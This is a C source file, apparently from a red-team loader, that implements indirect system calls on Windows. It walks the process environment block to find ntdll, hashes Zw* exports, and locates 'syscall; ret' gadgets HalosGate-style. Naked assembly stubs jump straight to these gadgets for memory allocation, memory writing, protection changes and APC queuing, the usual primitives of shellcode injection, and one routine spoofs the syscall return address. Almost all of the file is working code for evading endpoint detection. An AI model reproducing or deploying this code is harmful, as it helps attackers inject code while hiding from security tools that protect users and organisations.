#include "sys_64.h"
#include <stdio.h>

//#define DEBUG

#define JUMPER

#ifdef _M_IX86

EXTERN_C PVOID internal_cleancall_wow64_gate(VOID) {
    return (PVOID)__readfsdword(0xC0);
}

__declspec(naked) BOOL local_is_wow64(void)
{
    asm(
        "mov eax, fs:[0xc0] \n"
        "test eax, eax \n"
        "jne wow64 \n"
        "mov eax, 0 \n"
        "ret \n"
        "wow64: \n"
        "mov eax, 1 \n"
        "ret \n"
    );
}

#endif

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

VAV_SYSCALL_LIST VAV_SyscallList;

// SEARCH_AND_REPLACE
#ifdef SEARCH_AND_REPLACE
// THIS IS NOT DEFINED HERE; don't know if I'll add it in a future release
EXTERN void SearchAndReplace(unsigned char[], unsigned char[]);
#endif

DWORD VAV_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = VAV_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + VAV_ROR8(Hash);
    }

    return Hash;
}

#ifndef JUMPER
PVOID SC_Address(PVOID NtApiAddress)
{
    return NULL;
}
#else
PVOID SC_Address(PVOID NtApiAddress)
{
    DWORD searchLimit = 512;
    PVOID SyscallAddress;

   #ifdef _WIN64
    // If the process is 64-bit on a 64-bit OS, we need to search for syscall
    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
    ULONG distance_to_syscall = 0x12;
   #else
    // If the process is 32-bit on a 32-bit OS, we need to search for sysenter
    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
    ULONG distance_to_syscall = 0x0f;
   #endif

  #ifdef _M_IX86
    // If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved
    if (local_is_wow64())
    {
    #ifdef DEBUG
        printf("[+] Running 32-bit app on x64 (WOW64)\n");
    #endif
        return NULL;
    }
  #endif

    // we don't really care if there is a 'jmp' between
    // NtApiAddress and the 'syscall; ret' instructions
    SyscallAddress = VAV_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);

    if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
    {
        // we can use the original code for this system call :)
        #if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
        #endif
        return SyscallAddress;
    }

    // the 'syscall; ret' intructions have not been found,
    // we will try to use one near it, similarly to HalosGate

    for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
    {
        // let's try with an Nt* API below our syscall
        SyscallAddress = VAV_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall + num_jumps * 0x20);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
        #if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
        #endif
            return SyscallAddress;
        }

        // let's try with an Nt* API above our syscall
        SyscallAddress = VAV_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall - num_jumps * 0x20);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
        #if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
        #endif
            return SyscallAddress;
        }
    }

#ifdef DEBUG
    printf("Syscall Opcodes not found!\n");
#endif

    return NULL;
}
#endif


BOOL VAV_PopulateSyscallList()
{
    // Return early if the list is already populated.
    if (VAV_SyscallList.Count) return TRUE;

    #ifdef _WIN64
    PVAV_PEB Peb = (PVAV_PEB)__readgsqword(0x60);
    #else
    PVAV_PEB Peb = (PVAV_PEB)__readfsdword(0x30);
    #endif
    PVAV_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PVAV_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PVAV_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PVAV_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = VAV_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)VAV_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = VAV_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = VAV_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = VAV_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = VAV_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate VAV_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PVAV_SYSCALL_ENTRY Entries = VAV_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = VAV_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 0x775a)
        {
            Entries[i].Hash = VAV_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
            Entries[i].SyscallAddress = SC_Address(VAV_RVA2VA(PVOID, DllBase, Entries[i].Address));

            i++;
            if (i == VAV_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    VAV_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    for (DWORD i = 0; i < VAV_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < VAV_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                VAV_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;
                TempEntry.SyscallAddress = Entries[j].SyscallAddress;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;
                Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
                Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
            }
        }
    }

    return TRUE;
}

EXTERN_C DWORD VAV_GetSyscallNumber(DWORD FunctionHash)
{
    // Ensure VAV_SyscallList is populated.
    if (!VAV_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i < VAV_SyscallList.Count; i++)
    {
        if (FunctionHash == VAV_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}

EXTERN_C PVOID VAV_GetSyscallAddress(DWORD FunctionHash)
{
    // Ensure VAV_SyscallList is populated.
    if (!VAV_PopulateSyscallList()) return NULL;

    for (DWORD i = 0; i < VAV_SyscallList.Count; i++)
    {
        if (FunctionHash == VAV_SyscallList.Entries[i].Hash)
        {
            return VAV_SyscallList.Entries[i].SyscallAddress;
        }
    }

    return NULL;
}

EXTERN_C PVOID VAV_GetRandomSyscallAddress(DWORD FunctionHash)
{
    // Ensure VAV_SyscallList is populated.
    if (!VAV_PopulateSyscallList()) return NULL;

    DWORD index = ((DWORD) rand()) % VAV_SyscallList.Count;

    while (FunctionHash == VAV_SyscallList.Entries[index].Hash){
        // Spoofing the syscall return address
        index = ((DWORD) rand()) % VAV_SyscallList.Count;
    }
    return VAV_SyscallList.Entries[index].SyscallAddress;
}
#if defined(__GNUC__)

__declspec(naked) NTSTATUS VAV_NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL)
{
	asm(
		"mov [rsp +8], rcx \n"
		"mov [rsp+16], rdx \n"
		"mov [rsp+24], r8 \n"
		"mov [rsp+32], r9 \n"
		"sub rsp, 0x28 \n"
		"mov ecx, 0x0DA00733 \n"
		"call VAV_GetSyscallAddress \n"
		"mov r11, rax \n"
		"mov ecx, 0x0DA00733 \n"
		"call VAV_GetSyscallNumber \n"
		"add rsp, 0x28 \n"
		"mov rcx, [rsp+8] \n"
		"mov rdx, [rsp+16] \n"
		"mov r8, [rsp+24] \n"
		"mov r9, [rsp+32] \n"
		"mov r10, rcx \n"
		"jmp r11 \n"
	);
}

__declspec(naked) NTSTATUS VAV_NtAllocateVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID * BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect)
{
	asm(
		"mov [rsp +8], rcx \n"
		"mov [rsp+16], rdx \n"
		"mov [rsp+24], r8 \n"
		"mov [rsp+32], r9 \n"
		"sub rsp, 0x28 \n"
		"mov ecx, 0x19910F1F \n"
		"call VAV_GetSyscallAddress \n"
		"mov r11, rax \n"
		"mov ecx, 0x19910F1F \n"
		"call VAV_GetSyscallNumber \n"
		"add rsp, 0x28 \n"
		"mov rcx, [rsp+8] \n"
		"mov rdx, [rsp+16] \n"
		"mov r8, [rsp+24] \n"
		"mov r9, [rsp+32] \n"
		"mov r10, rcx \n"
		"jmp r11 \n"
	);
}

__declspec(naked) NTSTATUS VAVNtQueueApcThread(
	IN HANDLE ThreadHandle,
	IN PKNORMAL_ROUTINE ApcRoutine,
	IN PVOID ApcArgument1 OPTIONAL,
	IN PVOID ApcArgument2 OPTIONAL,
	IN PVOID ApcArgument3 OPTIONAL)
{
	asm(
		"mov [rsp +8], rcx \n"
		"mov [rsp+16], rdx \n"
		"mov [rsp+24], r8 \n"
		"mov [rsp+32], r9 \n"
		"sub rsp, 0x28 \n"
		"mov ecx, 0x06920C3B \n"
		"call VAV_GetSyscallAddress \n"
		"mov r11, rax \n"
		"mov ecx, 0x06920C3B \n"
		"call VAV_GetSyscallNumber \n"
		"add rsp, 0x28 \n"
		"mov rcx, [rsp+8] \n"
		"mov rdx, [rsp+16] \n"
		"mov r8, [rsp+24] \n"
		"mov r9, [rsp+32] \n"
		"mov r10, rcx \n"
		"jmp r11 \n"
	);
}

__declspec(naked) NTSTATUS VAVNtTestAlert()
{
	asm(
		"mov [rsp +8], rcx \n"
		"mov [rsp+16], rdx \n"
		"mov [rsp+24], r8 \n"
		"mov [rsp+32], r9 \n"
		"sub rsp, 0x28 \n"
		"mov ecx, 0x469C6F38 \n"
		"call VAV_GetSyscallAddress \n"
		"mov r11, rax \n"
		"mov ecx, 0x469C6F38 \n"
		"call VAV_GetSyscallNumber \n"
		"add rsp, 0x28 \n"
		"mov rcx, [rsp+8] \n"
		"mov rdx, [rsp+16] \n"
		"mov r8, [rsp+24] \n"
		"mov r9, [rsp+32] \n"
		"mov r10, rcx \n"
		"jmp r11 \n"
	);
}

__declspec(naked) NTSTATUS VAV_NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID * BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect)
{
	asm(
		"mov [rsp +8], rcx \n"
		"mov [rsp+16], rdx \n"
		"mov [rsp+24], r8 \n"
		"mov [rsp+32], r9 \n"
		"sub rsp, 0x28 \n"
		"mov ecx, 0xBEADD248 \n"
		"call VAV_GetSyscallAddress \n"
		"mov r11, rax \n"
		"mov ecx, 0xBEADD248 \n"
		"call VAV_GetSyscallNumber \n"
		"add rsp, 0x28 \n"
		"mov rcx, [rsp+8] \n"
		"mov rdx, [rsp+16] \n"
		"mov r8, [rsp+24] \n"
		"mov r9, [rsp+32] \n"
		"mov r10, rcx \n"
		"jmp r11 \n"
	);
}

#endif
